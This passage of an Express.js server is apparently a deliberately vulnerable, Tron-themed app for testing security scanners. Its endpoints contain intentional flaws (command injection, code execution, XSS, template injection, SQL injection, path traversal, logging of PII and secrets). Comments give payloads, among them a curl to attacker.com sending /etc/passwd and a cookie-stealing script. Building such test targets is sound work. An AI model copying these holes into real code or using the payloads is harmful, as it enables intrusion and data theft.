                 WHERE username = '${username}' OR email = '${email}'
                 ORDER BY ${orderBy || 'created_at'} DESC`;

  mysqlPool.query(query, (err, results) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ users: results });
  });
});

/**
 * SHADOW API — NOT IN OPENAPI SPEC
 * @route POST /api/v2/grid/scan
 * @description Run a network scan against a Grid sector node
 * VULNERABILITY: OS Command Injection via execSync — synchronous, no sandbox
 * CWE-78: Improper Neutralization of Special Elements used in an OS Command
 */
app.post('/api/v2/grid/scan', authenticateToken, (req, res) => {
  const { target, flags } = req.body;

  // VULNERABILITY: execSync with direct string interpolation — CRITICAL
  // Blocks the event loop AND executes shell commands with full server privileges
  // Payload: { "target": "localhost", "flags": "-sV; curl http://attacker.com/$(cat /etc/passwd)" }
  const output = execSync(`nmap ${flags || '-sV'} ${target}`);

  res.json({
    scanResult: output.toString(),
    target,
    executedCommand: `nmap ${flags} ${target}`,  // VULNERABILITY: executed command returned
  });
});

/**
 * SHADOW API — NOT IN OPENAPI SPEC
 * @route POST /api/v2/grid/compile
 * @description Compile and load a dynamic Grid program module
 * VULNERABILITY: Remote Code Execution via new Function() and vm.runInNewContext()
 * CWE-94: Improper Control of Generation of Code
 */
app.post('/api/v2/grid/compile', authenticateToken, (req, res) => {
  const { source, context } = req.body;

  // VULNERABILITY: new Function() — executes arbitrary JS with access to closure scope
  // Payload: { "source": "require('child_process').execSync('id').toString()" }
  const compiledFn = new Function('require', 'process', '__dirname', source);
  const fnResult   = compiledFn(require, process, __dirname);

  // VULNERABILITY: vm.runInNewContext — sandbox escape possible in Node < 20
  const sandboxCtx = { require, process, result: null, ...context };
  vm.runInNewContext(`result = (${source})`, sandboxCtx);

  res.json({
    compiled: true,
    fnResult,
    vmResult: sandboxCtx.result,
    message:  'Program compiled and instantiated on the Grid runtime.',
  });
});

/**
 * SHADOW API — NOT IN OPENAPI SPEC
 * @route GET /api/v2/programs/badge
 * @description Render an HTML identity badge for a program
 * VULNERABILITY: Reflected Cross-Site Scripting (XSS) — user input directly in HTML
 * CWE-79: Improper Neutralization of Input During Web Page Generation
 */
app.get('/api/v2/programs/badge', (req, res) => {
  const { name, sector, color } = req.query;

  // VULNERABILITY: All three query params injected raw into HTML — no encoding
  // Payload: ?name=<script>fetch('https://attacker.com/?c='+document.cookie)</script>
  // Payload: ?color=blue" onmouseover="alert(1)
  res.setHeader('Content-Type', 'text/html');
  res.send(`
    <!DOCTYPE html>
    <html>
      <head><title>Grid Identity Badge</title></head>
      <body style="background:#000; color:#${color || '00d4ff'}; font-family:monospace;">
        <div class="badge">
          <h1>PROGRAM: ${name}</h1>
          <p>SECTOR: ${sector}</p>
          <p>GRID: TRON-ARES | ENCOM DIVISION</p>
        </div>
      </body>
    </html>
  `);
});

/**
 * SHADOW API — NOT IN OPENAPI SPEC
 * @route POST /api/v2/grid/template
 * @description Render a Grid notification using a Handlebars template
 * VULNERABILITY: Server-Side Template Injection via Handlebars
 * CWE-94 + Handlebars prototype pollution RCE (CVE-2019-19919)
 */
app.post('/api/v2/grid/template', authenticateToken, (req, res) => {
  const handlebars = require('handlebars');
  const { template, data } = req.body;

  // VULNERABILITY: User-supplied template string compiled at runtime
  // Payload: { "template": "{{#with (lookup (lookup . 'constructor') 'name')}}{{this}}{{/with}}" }
  // Payload for RCE: {{#with \"s\" as |string|}}...prototype pollution chain...
  const compiled = handlebars.compile(template);
  const rendered = compiled(data || {});

  res.json({ rendered, message: 'Grid notification dispatched' });
});

/**
 * SHADOW API — NOT IN OPENAPI SPEC
 * @route GET /api/v2/grid/log
 * @description Stream a Grid sector log file — Log Injection + Path Traversal
 * VULNERABILITY: Log Injection AND Path Traversal
 * CWE-117: Improper Output Neutralization for Logs + CWE-22: Path Traversal
 */
app.get('/api/v2/grid/log', authenticateToken, (req, res) => {
  const { logfile, filter } = req.query;

  // VULNERABILITY: Path traversal — logfile not sanitized
  const logPath = path.resolve('/var/log/grid/', logfile);

  // VULNERABILITY: execSync with user-controlled filter — command injection via grep
  // Payload: ?logfile=../../etc/passwd&filter=root;id
  const output = execSync(`grep '${filter}' ${logPath} 2>&1 || echo 'no matches'`);

  // VULNERABILITY: log injection — filter value written to application log
  console.log(`[GRID-LOG] Sector log accessed by ${req.program.username}, filter: ${filter}`);

  res.json({ logfile: logPath, contents: output.toString() });
});

// ============================================================
// DOCUMENTED APIs — Newly added endpoints matching openapi.yaml
// These generate Sensitive Data findings across all 5 categories:
//   Name, Personal Data, Address, Bank, Secrets
// ============================================================

/**
 * DOCUMENTED — IN OPENAPI SPEC
 * @route POST /api/v2/users/register
 * @description Register a new Grid user — collects full PII, no auth
 * All five sensitive data categories present in request + response body
 */
app.post('/api/v2/users/register', async (req, res) => {
  const {
    firstname, surname, familyname, fullname, name,     // Name
    email, phone, mobile, birthday, dob, dateofbirth,   // Personal Data
    socialsecurity, ssn, driverslicense,                 // Personal Data
    address, zipcode,                                    // Address
    cardnumber, credit, account,                         // Bank
    password, pwd, pass, credentials, apikey, secret, auth, // Secrets
  } = req.body;

  // VULNERABILITY: Logging full PII on registration — CWE-532
  console.log(`[GRID-REGISTER] New user: ${firstname} ${surname}, SSN: ${socialsecurity}, Card: ${cardnumber}, Pass: ${password}`);

  try {
    // VULNERABILITY: Mass assignment — entire req.body saved without sanitization
    const newUser = new User(req.body);
    await newUser.save();

    // VULNERABILITY: Full PII returned in 201 response, no field filtering
    res.status(201).json({
      message:        'Program registered on the Grid',
      user:           newUser,
      // Sensitive data echoed back for "confirmation"
      firstname, surname, fullname, email, phone, mobile,
      birthday, dob, socialsecurity, ssn, driverslicense,
      address, zipcode,
      cardnumber, credit, account,
      apikey, credentials,
    });
  } catch (err) {
    res.status(500).json({ error: err.message, stack: err.stack });
  }
});

/**
 * DOCUMENTED — IN OPENAPI SPEC
 * @route GET /api/v2/grid/accounts
 * @route POST /api/v2/grid/accounts
 * @description Grid payment account management — no auth, full PCI data
 * Bank + Name + Personal Data + Secrets categories
 */
app.get('/api/v2/grid/accounts', async (req, res) => {
  const { email, fullname, cardnumber, account, zipcode } = req.query;

  // VULNERABILITY: SQL injection in account lookup
  // Payload: ?cardnumber=4111' OR '1'='1
  const query = `SELECT accountId, fullname, firstname, surname, email, phone,
                        address, zipcode, cardnumber, credit, account, apikey, credentials
                 FROM grid_accounts
                 WHERE email = '${email}' OR cardnumber = '${cardnumber}'
                    OR account = '${account}' OR fullname LIKE '%${fullname}%'`;

  mysqlPool.query(query, (err, results) => {
    if (err) return res.status(500).json({ error: err.message, query });
    res.json({ accounts: results, total: results.length });
  });
});

app.post('/api/v2/grid/accounts', async (req, res) => {
  const { fullname, firstname, surname, email, phone, address, zipcode,
          cardnumber, credit, account, apikey, credentials } = req.body;

  // VULNERABILITY: SQL injection in INSERT
  const query = `INSERT INTO grid_accounts
                   (fullname, firstname, surname, email, phone, address, zipcode, cardnumber, credit, account, apikey, credentials)
                 VALUES
                   ('${fullname}', '${firstname}', '${surname}', '${email}', '${phone}',
                    '${address}', '${zipcode}', '${cardnumber}', '${credit}', '${account}',
                    '${apikey}', '${credentials}')`;

  // VULNERABILITY: PCI data logged — CWE-532
  console.log(`[GRID-ACCOUNT] New account: ${fullname}, card: ${cardnumber}, apikey: ${apikey}`);

  mysqlPool.query(query, (err, result) => {
    if (err) return res.status(500).json({ error: err.message });
    res.status(201).json({ accountId: result.insertId, fullname, firstname, surname,
                           email, phone, address, zipcode, cardnumber, credit, account, apikey });
  });
});

/**
 * DOCUMENTED — IN OPENAPI SPEC
 * @route POST /api/v2/isos/register
 * @description Enroll ISO program — collects identity + biometric PII, no auth
 * Name + Personal Data + Address + Secrets categories
 */
app.post('/api/v2/isos/register', async (req, res) => {
  const {
    name, fullname, firstname,
    email, phone, mobile, birthday, dob, socialsecurity, driverslicense,
    address, zipcode,
    credentials, secret, auth,
  } = req.body;

  // VULNERABILITY: Full PII including SSN and driver's license saved without auth
  const newIso = new Program({ name: fullname || name, isIso: true, ...req.body });
  await newIso.save();

  // VULNERABILITY: Sensitive fields returned in response
  res.status(201).json({
    message: 'ISO program enrolled on the Grid',
    iso:     newIso,
    profile: { name, fullname, firstname, email, phone, mobile,
               birthday, dob, socialsecurity, driverslicense,
               address, zipcode, credentials, secret, auth },
  });
});

// ============================================================
// Global Error Handler
// VULNERABILITY: Leaks full error stack traces in production
// ============================================================
app.use((err, req, res, next) => {
  console.error('[GRID-ERROR]', err);
  res.status(err.status || 500).json({
    error:      err.message,
    stack:      err.stack,   // Never expose stack traces in production
    gridStatus: 'FAULT_STATE',
  });
});

// ============================================================
// VULNERABILITY: Listening on all interfaces (0.0.0.0)
// Should be restricted to localhost in non-production
// ============================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`[THE GRID] Server online at port ${PORT}`);
  console.log(`[THE GRID] JWT Secret: ${JWT_SECRET}`);         // VULNERABILITY: secret logged on startup
  console.log(`[THE GRID] Admin Token: ${ADMIN_TOKEN}`);       // VULNERABILITY: admin token logged
  console.log(`[THE GRID] CLU Override: ${CLU_MASTER_OVERRIDE}`); // VULNERABILITY: master key logged
  console.log('[THE GRID] "The Grid. A digital frontier." — Kevin Flynn');
  console.log('[THE GRID] "End of Line." — Master Control Program');
});

module.exports = app;
